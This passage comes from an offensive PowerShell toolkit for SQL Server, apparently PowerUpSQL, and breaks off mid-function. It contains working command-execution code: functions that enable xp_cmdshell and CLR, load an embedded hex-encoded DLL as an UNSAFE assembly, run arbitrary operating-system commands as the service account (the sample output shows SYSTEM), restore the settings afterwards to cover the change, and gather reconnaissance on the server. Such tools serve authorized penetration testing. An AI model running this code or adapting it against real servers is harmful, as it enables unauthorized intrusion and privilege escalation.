                    $DisableShowAdvancedOptions = 1

                    # Try to enable Show Advanced Options
                    Get-SQLQuery -Instance $Instance -Query "sp_configure 'Show Advanced Options',1;RECONFIGURE" -Username $Username -Password $Password -Credential $Credential -SuppressVerbose

                    # Check if configuration change worked
                    $IsShowAdvancedEnabled2 = Get-SQLQuery -Instance $Instance -Query "sp_configure 'Show Advanced Options'" -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Select-Object -Property config_value -ExpandProperty config_value

                    if ($IsShowAdvancedEnabled2 -eq 1)
                    {
                        Write-Verbose -Message "$Instance : Enabled Show Advanced Options."
                    }
                    else
                    {
                        Write-Verbose -Message "$Instance : Enabling Show Advanced Options failed. Aborting."

                        # Add record
                        $null = $TblResults.Rows.Add("$ComputerName","$Instance",'Could not enable Show Advanced Options.')
                        return
                    }
                }

                # Enable xp_cmdshell if needed
                if ($IsXpCmdshellEnabled -eq 1)
                {
                    Write-Verbose -Message "$Instance : xp_cmdshell is already enabled."
                }
                else
                {
                    Write-Verbose -Message "$Instance : xp_cmdshell is disabled."
                    $DisableXpCmdshell = 1

                    # Try to enable xp_cmdshell
                    Get-SQLQuery -Instance $Instance -Query "sp_configure 'xp_cmdshell',1;RECONFIGURE" -Username $Username -Password $Password -Credential $Credential -SuppressVerbose

                    # Check if configuration change worked
                    $IsXpCmdshellEnabled2 = Get-SQLQuery -Instance $Instance -Query 'sp_configure xp_cmdshell' -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Select-Object -Property config_value -ExpandProperty config_value

                    if ($IsXpCmdshellEnabled2 -eq 1)
                    {
                        Write-Verbose -Message "$Instance : Enabled xp_cmdshell."
                    }
                    else
                    {
                        Write-Verbose -Message "$Instance : Enabling xp_cmdshell failed. Aborting."

                        # Add record
                        $null = $TblResults.Rows.Add("$ComputerName","$Instance",'Could not enable xp_cmdshell.')

                        return
                    }
                }

                # Setup OS command
                Write-Verbose -Message "$Instance : Running command: $Command"
                #$Query = "EXEC master..xp_cmdshell '$Command' WITH RESULT SETS ((output VARCHAR(MAX)))"
                $Query = "EXEC master..xp_cmdshell '$Command'"

                # Execute OS command
                $CmdResults = Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Select-Object -Property output -ExpandProperty output

                # Display results or add to final results table
                if($RawResults)
                {
                    $CmdResults
                }
                else
                {
                    $null = $TblResults.Rows.Add($ComputerName, $Instance, [string]$CmdResults)
                }

                # Restore xp_cmdshell state if needed
                if($DisableXpCmdshell -eq 1)
                {
                    Write-Verbose -Message "$Instance : Disabling xp_cmdshell"
                    Get-SQLQuery -Instance $Instance -Query "sp_configure 'xp_cmdshell',0;RECONFIGURE" -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
                }

                # Restore Show Advanced Options state if needed
                if($DisableShowAdvancedOptions -eq 1)
                {
                    Write-Verbose -Message "$Instance : Disabling Show Advanced Options"
                    Get-SQLQuery -Instance $Instance -Query "sp_configure 'Show Advanced Options',0;RECONFIGURE" -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
                }

                # Close connection
                $Connection.Close()

                # Dispose connection
                $Connection.Dispose()
            }
            catch
            {
                # Connection failed

                if(-not $SuppressVerbose)
                {
                    $ErrorMessage = $_.Exception.Message
                    Write-Verbose -Message "$Instance : Connection Failed."
                    #Write-Verbose  " Error: $ErrorMessage"
                }

                # Add record
                $null = $TblResults.Rows.Add("$ComputerName","$Instance",'Not Accessible')
            }
        }

        # Run scriptblock using multi-threading
        $PipelineItems | Invoke-Parallel -ScriptBlock $MyScriptBlock -ImportSessionFunctions -ImportVariables -Throttle $Threads -RunspaceTimeout 2 -Quiet -ErrorAction SilentlyContinue

        return $TblResults
    }
}


# ----------------------------------
#  Invoke-SQLOSCmdCLR
# ----------------------------------
# Author: Scott Sutherland
# Note: This is based on Nathan Kirk's CRL template. 
# Reference: http://sekirkity.com/seeclrly-fileless-sql-server-clr-based-custom-stored-procedure-command-execution/
# Reference: https://msdn.microsoft.com/en-us/library/microsoft.sqlserver.server.sqlpipe.sendresultsrow(v=vs.110).aspx
Function  Invoke-SQLOSCmdCLR
{
    <#
            .SYNOPSIS
            Execute command on the operating system as the SQL Server service account using a 
            generated CLR assembly with CREATE ASSEMBLY and CREATE PROCEDURE. 
            Supports threading, raw output, and table output.
            .PARAMETER Username
            SQL Server or domain account to authenticate with.
            .PARAMETER Password
            SQL Server or domain account password to authenticate with.
            .PARAMETER Credential
            SQL Server credential.
            .PARAMETER Instance
            SQL Server instance to connection to.
            .PARAMETER DAC
            Connect using Dedicated Admin Connection.
            .PARAMETER TimeOut
            Connection time out.
            .PARAMETER SuppressVerbose
            Suppress verbose errors.  Used when function is wrapped.
            .PARAMETER Threads
            Number of concurrent threads.
            .PARAMETER Command
            Operating command to be executed on the SQL Server.
            .PARAMETER RawResults
            Just show the raw results without the computer or instance name.
            .EXAMPLE
            PS C:\> Get-SQLInstanceLocal | Invoke-SQLOSCmdCLR -Verbose -Command "whoami"
            VERBOSE: Creating runspace pool and session states
            VERBOSE: MSSQLSRV04 : Connection Failed.
            VERBOSE: MSSQLSRV04\BOSCHSQL : Connection Success.
            VERBOSE: MSSQLSRV04\BOSCHSQL : You are not a sysadmin. This command requires sysadmin privileges.
            VERBOSE: MSSQLSRV04\SQLSERVER2014 : Connection Success.
            VERBOSE: MSSQLSRV04\SQLSERVER2014 : You are a sysadmin.
            VERBOSE: MSSQLSRV04\SQLSERVER2014 : Show Advanced Options is already enabled.
            VERBOSE: MSSQLSRV04\SQLSERVER2014 : CLR is already enabled.
            VERBOSE: MSSQLSRV04\SQLSERVER2014 : Running command: whoami
            VERBOSE: MSSQLSRV04\SQLSERVER2016 : Connection Failed.
            VERBOSE: Closing the runspace pool

            ComputerName                                      Instance                                          CommandResults                                   
            ------------                                      --------                                          --------------                                                                                 
            MSSQLSRV04                                        MSSQLSRV04\BOSCHSQL                               No sysadmin privileges.                          
            MSSQLSRV04                                        MSSQLSRV04\SQLSERVER2014                          nt authority\system                              
            MSSQLSRV04                                        MSSQLSRV04\SQLSERVER2016                          Not Accessible
    #>
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,

        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipeline = $true,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Connect using Dedicated Admin Connection.')]
        [Switch]$DAC,

        [Parameter(Mandatory = $true,
        HelpMessage = 'OS command to be executed.')]
        [String]$Command,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Connection timeout.')]
        [string]$TimeOut,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Number of threads.')]
        [int]$Threads = 1,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Just show the raw results without the computer or instance name.')]
        [switch]$RawResults
    )

    Begin
    {
        # Setup data table for output
        $TblCommands = New-Object -TypeName System.Data.DataTable
        $TblResults = New-Object -TypeName System.Data.DataTable
        $null = $TblResults.Columns.Add('ComputerName')
        $null = $TblResults.Columns.Add('Instance')
        $null = $TblResults.Columns.Add('CommandResults')


        # Setup data table for pipeline threading
        $PipelineItems = New-Object -TypeName System.Data.DataTable

        # set instance to local host by default
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }

        # Ensure provided instance is processed
        if($Instance)
        {
            $ProvideInstance = New-Object -TypeName PSObject -Property @{
                Instance = $Instance
            }
        }

        # Add instance to instance list
        $PipelineItems = $PipelineItems + $ProvideInstance
    }

    Process
    {
        # Create list of pipeline items
        $PipelineItems = $PipelineItems + $_
    }

    End
    {
        # Define code to be multi-threaded
        $MyScriptBlock = {
            $Instance = $_.Instance

            # Parse computer name from the instance
            $ComputerName = Get-ComputerNameFromInstance -Instance $Instance

            # Default connection to local default instance
            if(-not $Instance)
            {
                $Instance = $env:COMPUTERNAME
            }

            # Setup DAC string
            if($DAC)
            {
                # Create connection object
                $Connection = Get-SQLConnectionObject -Instance $Instance -Username $Username -Password $Password -Credential $Credential -DAC -TimeOut $TimeOut
            }
            else
            {
                # Create connection object
                $Connection = Get-SQLConnectionObject -Instance $Instance -Username $Username -Password $Password -Credential $Credential -TimeOut $TimeOut
            }

            # Attempt connection
            try
            {
                # Open connection
                $Connection.Open()

                if(-not $SuppressVerbose)
                {
                    Write-Verbose -Message "$Instance : Connection Success."
                }

                # Switch to track CLR status
                $DisableShowAdvancedOptions = 0
                $DisableCLR = 0

                # Get sysadmin status
                $IsSysadmin = Get-SQLSysadminCheck -Instance $Instance -Credential $Credential -Username $Username -Password $Password -SuppressVerbose | Select-Object -Property IsSysadmin -ExpandProperty IsSysadmin

                # Check if CLR is enabled
                if($IsSysadmin -eq 'Yes')
                {
                    Write-Verbose -Message "$Instance : You are a sysadmin."
                    $IsCLREnabled = Get-SQLQuery -Instance $Instance -Query "sp_configure 'CLR Enabled'" -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Select-Object -Property config_value -ExpandProperty config_value
                    $IsShowAdvancedEnabled = Get-SQLQuery -Instance $Instance -Query "sp_configure 'Show Advanced Options'" -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Select-Object -Property config_value -ExpandProperty config_value
                }
                else
                {
                    Write-Verbose -Message "$Instance : You are not a sysadmin. This command requires sysadmin privileges."

                    # Add record
                    $null = $TblResults.Rows.Add("$ComputerName","$Instance",'No sysadmin privileges.')
                    return
                }

                # Enable show advanced options if needed
                if ($IsShowAdvancedEnabled -eq 1)
                {
                    Write-Verbose -Message "$Instance : Show Advanced Options is already enabled."
                }
                else
                {
                    Write-Verbose -Message "$Instance : Show Advanced Options is disabled."
                    $DisableShowAdvancedOptions = 1

                    # Try to enable Show Advanced Options
                    Get-SQLQuery -Instance $Instance -Query "sp_configure 'Show Advanced Options',1;RECONFIGURE" -Username $Username -Password $Password -Credential $Credential -SuppressVerbose

                    # Check if configuration change worked
                    $IsShowAdvancedEnabled2 = Get-SQLQuery -Instance $Instance -Query "sp_configure 'Show Advanced Options'" -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Select-Object -Property config_value -ExpandProperty config_value

                    if ($IsShowAdvancedEnabled2 -eq 1)
                    {
                        Write-Verbose -Message "$Instance : Enabled Show Advanced Options."
                    }
                    else
                    {
                        Write-Verbose -Message "$Instance : Enabling Show Advanced Options failed. Aborting."

                        # Add record
                        $null = $TblResults.Rows.Add("$ComputerName","$Instance",'Could not enable Show Advanced Options.')
                        return
                    }
                }

                # Enable CLR if needed
                if ($IsCLREnabled -eq 1)
                {
                    Write-Verbose -Message "$Instance : CLR is already enabled."
                }
                else
                {
                    Write-Verbose -Message "$Instance : CLR is disabled."
                    $DisableCLR = 1

                    # Try to enable CLR
                    Get-SQLQuery -Instance $Instance -Query "sp_configure 'CLR Enabled',1;RECONFIGURE" -Username $Username -Password $Password -Credential $Credential -SuppressVerbose

                    # Check if configuration change worked
                    $IsCLREnabled2 = Get-SQLQuery -Instance $Instance -Query 'sp_configure "CLR Enabled"' -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Select-Object -Property config_value -ExpandProperty config_value

                    if ($IsCLREnabled2 -eq 1)
                    {
                        Write-Verbose -Message "$Instance : Enabled CLR."
                    }
                    else
                    {
                        Write-Verbose -Message "$Instance : Enabling CLR failed. Aborting."

                        # Add record
                        $null = $TblResults.Rows.Add("$ComputerName","$Instance",'Could not enable CLR.')

                        return
                    }
                }

                # Create assembly
                $Query_AddAssembly = "CREATE ASSEMBLY [cmd_exec] AUTHORIZATION [dbo] from 0x4D5A90000300000004000000FFFF0000B800000000000000400000000000000000000000000000000000000000000000000000000000000000000000800000000E1FBA0E00B409CD21B8014CCD21546869732070726F6772616D2063616E6E6F742062652072756E20696E20444F53206D6F64652E0D0D0A2400000000000000504500004C0103008A8FF9580000000000000000E00002210B010B000008000000060000000000004E270000002000000040000000000010002000000002000004000000000000000400000000000000008000000002000000000000030040850000100000100000000010000010000000000000100000000000000000000000002700004B00000000400000A002000000000000000000000000000000000000006000000C00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000200000080000000000000000000000082000004800000000000000000000002E7465787400000054070000002000000008000000020000000000000000000000000000200000602E72737263000000A00200000040000000040000000A0000000000000000000000000000400000402E72656C6F6300000C0000000060000000020000000E000000000000000000000000000040000042000000000000000000000000000000003027000000000000480000000200050028210000D8050000010000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000013300500C30000000100001100730400000A0A066F0500000A72010000706F0600000A00066F0500000A72390000700F00280700000A280800000A6F0900000A00066F0500000A166F0A00000A00066F0500000A176F0B00000A00066F0C00000A26178D090000010C081672490000701F0C20A00F00006A730D00000AA208730E00000A0B280F00000A076F1000000A000716066F1100000A6F1200000A6F1300000A6F1400000A00280F00000A076F1500000A00280F00000A6F1600000A00066F1700000A00066F1800000A002A1E02281900000A2A0042534A4201000100000000000C00000076342E302E33303331390000000005006C000000E0010000237E00004C0200009002000023537472696E677300000000DC040000580000002355530034050000100000002347554944000000440500009400000023426C6F620000000000000002000001471502000900000000FA253300160000010000000F000000020000000200000001000000190000000300000001000000010000000300000000000A000100000000000600370030000A005F004A000600A40084000600C40084000A000501EA000E002E011B010E0036011B0106006C0130000A00BD01EA000A00C9013E000A00D301EA000A00E101EA000A00EC01EA00060018020E02060038020E0200000000010000000000010001000100100016000000050001000100502000000000960069000A0001001F21000000008618720010000200000001007800190072001400210072001000290072001000310072001000310047011E00390055012300110062012800410073012C0039007A01230039008801320039009C0132003100B7013700490072003B005900720043006100F4014A006900FD014F0031002502550079004302280009004D022800590056025A00690060024F0069006F02100031007E02100031008A02100009007200100020001B0019002E000B006A002E00130073006000048000000000000000000000000000000000E2000000040000000000000000000000010027000000000004000000000000000000000001003E000000000004000000000000000000000001003000000000000000003C4D6F64756C653E00434C5246696C652E646C6C0053746F72656450726F63656475726573006D73636F726C69620053797374656D004F626A6563740053797374656D2E446174610053797374656D2E446174612E53716C54797065730053716C537472696E6700636D645F65786563002E63746F720065786563436F6D6D616E640053797374656D2E52756E74696D652E436F6D70696C6572536572766963657300436F6D70696C6174696F6E52656C61786174696F6E734174747269627574650052756E74696D65436F6D7061746962696C69747941747472696275746500434C5246696C65004D6963726F736F66742E53716C5365727665722E5365727665720053716C50726F6365647572654174747269627574650053797374656D2E446961676E6F73746963730050726F636573730050726F636573735374617274496E666F006765745F5374617274496E666F007365745F46696C654E616D65006765745F56616C756500537472696E6700466F726D6174007365745F417267756D656E7473007365745F5573655368656C6C45786563757465007365745F52656469726563745374616E646172644F75747075740053746172740053716C4D657461446174610053716C4462547970650053716C446174615265636F72640053716C436F6E746578740053716C50697065006765745F506970650053656E64526573756C747353746172740053797374656D2E494F0053747265616D526561646572006765745F5374616E646172644F757470757400546578745265616465720052656164546F456E6400546F537472696E6700536574537472696E670053656E64526573756C7473526F770053656E64526573756C7473456E640057616974466F724578697400436C6F736500003743003A005C00570069006E0064006F00770073005C00530079007300740065006D00330032005C0063006D0064002E00650078006500000F20002F00430020007B0030007D00000D6F00750074007000750074000000FCEE91D85F31C540B0756AD6B62A5C020008B77A5C561934E0890500010111090320000104200101080401000000042000121D042001010E0320000E0500020E0E1C042001010203200002072003010E11290A062001011D1225040000123505200101122D042000123905200201080E0907031219122D1D12250801000800000000001E01000100540216577261704E6F6E457863657074696F6E5468726F77730100002827000000000000000000003E270000002000000000000000000000000000000000000000000000302700000000000000005F436F72446C6C4D61696E006D73636F7265652E646C6C0000000000FF25002000100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000100100000001800008000000000000000000000000000000100010000003000008000000000000000000000000000000100000000004800000058400000440200000000000000000000440234000000560053005F00560045005200530049004F004E005F0049004E0046004F0000000000BD04EFFE00000100000000000000000000000000000000003F000000000000000400000002000000000000000000000000000000440000000100560061007200460069006C00650049006E0066006F00000000002400040000005400720061006E0073006C006100740069006F006E00000000000000B004A4010000010053007400720069006E006700460069006C00650049006E0066006F0000008001000001003000300030003000300034006200300000002C0002000100460069006C0065004400650073006300720069007000740069006F006E000000000020000000300008000100460069006C006500560065007200730069006F006E000000000030002E0030002E0030002E003000000038000C00010049006E007400650072006E0061006C004E0061006D006500000043004C005200460069006C0065002E0064006C006C0000002800020001004C006500670061006C0043006F00700079007200690067006800740000002000000040000C0001004F0072006900670069006E0061006C00460069006C0065006E0061006D006500000043004C005200460069006C0065002E0064006C006C000000340008000100500072006F006400750063007400560065007200730069006F006E00000030002E0030002E0030002E003000000038000800010041007300730065006D0062006C0079002000560065007200730069006F006E00000030002E0030002E0030002E00300000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002000000C000000503700000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000 with permission_set = UNSAFE"
                Get-SQLQuery -Instance $Instance -Query $Query_AddAssembly -Username $Username -Password $Password -Credential $Credential -SuppressVerbose -Database "MSDB" 
                
                # Create procedure
                $Query_AddProc = "CREATE PROCEDURE [dbo].[cmd_exec] @execCommand NVARCHAR (MAX) AS EXTERNAL NAME [cmd_exec].[StoredProcedures].[cmd_exec];"
                Get-SQLQuery -Instance $Instance -Query $Query_AddProc -Username $Username -Password $Password -Credential $Credential -SuppressVerbose -Database "MSDB" 

                # Setup OS command
                Write-Verbose -Message "$Instance : Running command: $Command"
                $Query = "EXEC [dbo].[cmd_exec] '$Command'"                

                # Execute OS command
                $CmdResults = Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential -SuppressVerbose -Database "MSDB" | Select-Object -Property output -ExpandProperty output

                # Display results or add to final results table
                if($RawResults)
                {
                    $CmdResults
                }
                else
                {
                    $null = $TblResults.Rows.Add($ComputerName, $Instance, [string]$CmdResults.trim())
                }

                # Remove procedure and assembly
                Get-SQLQuery -Instance $Instance -Query "DROP PROCEDURE cmd_exec" -Username $Username -Password $Password -Credential $Credential -SuppressVerbose -Database "MSDB"
                Get-SQLQuery -Instance $Instance -Query "DROP ASSEMBLY cmd_exec" -Username $Username -Password $Password -Credential $Credential -SuppressVerbose -Database "MSDB"

                # Restore CLR state if needed
                if($DisableCLR -eq 1)
                {
                    Write-Verbose -Message "$Instance : Disabling CLR"
                    Get-SQLQuery -Instance $Instance -Query "sp_configure 'CLR Enabled',0;RECONFIGURE" -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
                }

                # Restore Show Advanced Options state if needed
                if($DisableShowAdvancedOptions -eq 1)
                {
                    Write-Verbose -Message "$Instance : Disabling Show Advanced Options"
                    Get-SQLQuery -Instance $Instance -Query "sp_configure 'Show Advanced Options',0;RECONFIGURE" -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
                }

                # Close connection
                $Connection.Close()

                # Dispose connection
                $Connection.Dispose()
            }
            catch
            {
                # Connection failed

                if(-not $SuppressVerbose)
                {
                    $ErrorMessage = $_.Exception.Message
                    Write-Verbose -Message "$Instance : Connection Failed."
                    #Write-Verbose  " Error: $ErrorMessage"
                }

                # Add record
                $null = $TblResults.Rows.Add("$ComputerName","$Instance",'Not Accessible')
            }
        }

        # Run scriptblock using multi-threading
        $PipelineItems | Invoke-Parallel -ScriptBlock $MyScriptBlock -ImportSessionFunctions -ImportVariables -Throttle $Threads -RunspaceTimeout 2 -Quiet -ErrorAction SilentlyContinue

        return $TblResults
    }
}


# ----------------------------------
#  Get-SQLServerInfo
# ----------------------------------
# Author: Scott Sutherland
Function  Get-SQLServerInfo
{
    <#
            .SYNOPSIS
            Returns basic server and user information from target SQL Servers.
            .PARAMETER Username
            SQL Server or domain account to authenticate with.
            .PARAMETER Password
            SQL Server or domain account password to authenticate with.
            .PARAMETER Credential
            SQL Server credential.
            .PARAMETER Instance
            SQL Server instance to connection to.
            .EXAMPLE
            PS C:\> Get-SQLServerInfo -Instance SQLServer1\STANDARDDEV2014

            ComputerName           : SQLServer1
            Instance               : SQLServer1\STANDARDDEV2014
            DomainName             : Domain
            ServiceProcessId       : 6758
            ServiceName            : MSSQL$STANDARDDEV2014
            ServiceAccount         : LocalSystem
            AuthenticationMode     : Windows and SQL Server Authentication
            Clustered              : No
            SQLServerVersionNumber : 12.0.4213.0
            SQLServerMajorVersion  : 2014
            SQLServerEdition       : Developer Edition (64-bit)
            SQLServerServicePack   : SP1
            OSArchitecture         : X64
            OsMachineType          : WinNT
            OSVersionName          : Windows 8.1 Pro
            OsVersionNumber        : 6.3
            Currentlogin           : Domain\MyUser
            IsSysadmin             : Yes
            ActiveSessions         : 1
            .EXAMPLE
            PS C:\> Get-SQLInstanceLocal | Get-SQLServerInfo -Verbose
    #>
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,

        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )

    Begin
    {
        # Table for output
        $TblServerInfo = New-Object -TypeName System.Data.DataTable
    }

    Process
    {
        # Parse computer name from the instance
        $ComputerName = Get-ComputerNameFromInstance -Instance $Instance

        # Default connection to local default instance
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }

        # Test connection to instance
        $TestConnection = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Where-Object -FilterScript {
            $_.Status -eq 'Accessible'
        }
        if($TestConnection)
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Success."
            }
        }
        else
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Failed."
            }
            return
        }

        # Get number of active sessions for server
        $ActiveSessions = Get-SQLSession -Instance $Instance -Credential $Credential -Username $Username -Password $Password -SuppressVerbose |
        Where-Object -FilterScript {
            $_.SessionStatus -eq 'running'
        } |
        Measure-Object -Line |
        Select-Object -Property Lines -ExpandProperty Lines

        # Get sysadmin status
        $IsSysadmin = Get-SQLSysadminCheck -Instance $Instance -Credential $Credential -Username $Username -Password $Password -SuppressVerbose | Select-Object -Property IsSysadmin -ExpandProperty IsSysadmin

        if($IsSysadmin -eq 'Yes')
        {
            # Grab additional information if sysadmin
            $SysadminSetup = "
                -- Get machine type
                DECLARE @MachineType  SYSNAME
                EXECUTE master.dbo.xp_regread
                @rootkey		= N'HKEY_LOCAL_MACHINE',
                @key			= N'SYSTEM\CurrentControlSet\Control\ProductOptions',
                @value_name		= N'ProductType',
                @value			= @MachineType output

                -- Get OS version
                DECLARE @ProductName  SYSNAME
                EXECUTE master.dbo.xp_regread
                @rootkey		= N'HKEY_LOCAL_MACHINE',
                @key			= N'SOFTWARE\Microsoft\Windows NT\CurrentVersion',
                @value_name		= N'ProductName',
            @value			= @ProductName output"

            $SysadminQuery = '  @MachineType as [OsMachineType],
            @ProductName as [OSVersionName],'
        }
        else
        {
            $SysadminSetup = ''
            $SysadminQuery = ''
        }

        # Define Query
        $Query = "  -- Get SQL Server Information

            -- Get SQL Server Service Name and Path
            DECLARE @SQLServerInstance varchar(250)
            DECLARE @SQLServerServiceName varchar(250)
            if @@SERVICENAME = 'MSSQLSERVER'
            BEGIN
            set @SQLServerInstance = 'SYSTEM\CurrentControlSet\Services\MSSQLSERVER'
            set @SQLServerServiceName = 'MSSQLSERVER'
            END
            ELSE
            BEGIN
            set @SQLServerInstance = 'SYSTEM\CurrentControlSet\Services\MSSQL$'+cast(@@SERVICENAME as varchar(250))
            set @SQLServerServiceName = 'MSSQL$'+cast(@@SERVICENAME as varchar(250))
            END

            -- Get SQL Server Service Account
            DECLARE @ServiceaccountName varchar(250)
            EXECUTE master.dbo.xp_instance_regread
            N'HKEY_LOCAL_MACHINE', @SQLServerInstance,
            N'ObjectName',@ServiceAccountName OUTPUT, N'no_output'

            -- Get authentication mode
            DECLARE @AuthenticationMode INT
            EXEC master.dbo.xp_instance_regread N'HKEY_LOCAL_MACHINE',
            N'Software\Microsoft\MSSQLServer\MSSQLServer',
            N'LoginMode', @AuthenticationMode OUTPUT

            -- Grab additional information as sysadmin
            $SysadminSetup

            -- Return server and version information
            SELECT  '$ComputerName' as [ComputerName],
            @@servername as [Instance],
            DEFAULT_DOMAIN() as [DomainName],
            SERVERPROPERTY('processid') as ServiceProcessID,
            @SQLServerServiceName as [ServiceName],
            @ServiceAccountName as [ServiceAccount],
            (SELECT CASE @AuthenticationMode
            WHEN 1 THEN 'Windows Authentication'
            WHEN 2 THEN 'Windows and SQL Server Authentication'
            ELSE 'Unknown'
            END) as [AuthenticationMode],
            CASE  SERVERPROPERTY('IsClustered')
            WHEN 0
            THEN 'No'
            ELSE 'Yes'
            END as [Clustered],
            SERVERPROPERTY('productversion') as [SQLServerVersionNumber],
            SUBSTRING(@@VERSION, CHARINDEX('2', @@VERSION), 4) as [SQLServerMajorVersion],
            serverproperty('Edition') as [SQLServerEdition],
            SERVERPROPERTY('ProductLevel') AS [SQLServerServicePack],
            SUBSTRING(@@VERSION, CHARINDEX('x', @@VERSION), 3) as [OSArchitecture],
            $SysadminQuery
            RIGHT(SUBSTRING(@@VERSION, CHARINDEX('Windows NT', @@VERSION), 14), 3) as [OsVersionNumber],
            SYSTEM_USER as [Currentlogin],
            '$IsSysadmin' as [IsSysadmin],
        '$ActiveSessions' as [ActiveSessions]"
        # Execute Query
        $TblServerInfoTemp = Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential -SuppressVerbose

        # Append as needed
        $TblServerInfo = $TblServerInfo + $TblServerInfoTemp
    }

    End
    {
        # Return data
        $TblServerInfo
    }
}


# ----------------------------------
#  Get-SQLServerInfoThreaded
# ----------------------------------
# Author: Scott Sutherland
Function  Get-SQLServerInfoThreaded
{
    <#
            .SYNOPSIS
            Returns basic server and user information from target SQL Servers.
            .PARAMETER Username
            SQL Server or domain account to authenticate with.
            .PARAMETER Password
            SQL Server or domain account password to authenticate with.
            .PARAMETER Credential
            SQL Server credential.
            .PARAMETER Instance
            SQL Server instance to connection to.
            .PARAMETER Instance
            Number of host threads.
            .EXAMPLE
            PS C:\> Get-SQLServerInfoThreaded -Instance SQLServer1\STANDARDDEV2014

            ComputerName           : SQLServer1
            Instance               : SQLServer1\STANDARDDEV2014
            DomainName             : Domain
            ServiceName            : MSSQL$STANDARDDEV2014
            ServiceAccount         : LocalSystem
            AuthenticationMode     : Windows and SQL Server Authentication
            Clustered              : No
            SQLServerVersionNumber : 12.0.4213.0
            SQLServerMajorVersion  : 2014
            SQLServerEdition       : Developer Edition (64-bit)
            SQLServerServicePack   : SP1
            OSArchitecture         : X64
            OsMachineType          : WinNT
            OSVersionName          : Windows 8.1 Pro
            OsVersionNumber        : 6.3
            Currentlogin           : Domain\MyUser
            IsSysadmin             : Yes
            ActiveSessions         : 1
            .EXAMPLE
            PS C:\> Get-SQLInstanceLocal | Get-SQLServerInfoThreaded -Verbose -Threads 20
    #>
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,

        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Number of threads.')]
        [int]$Threads = 5,

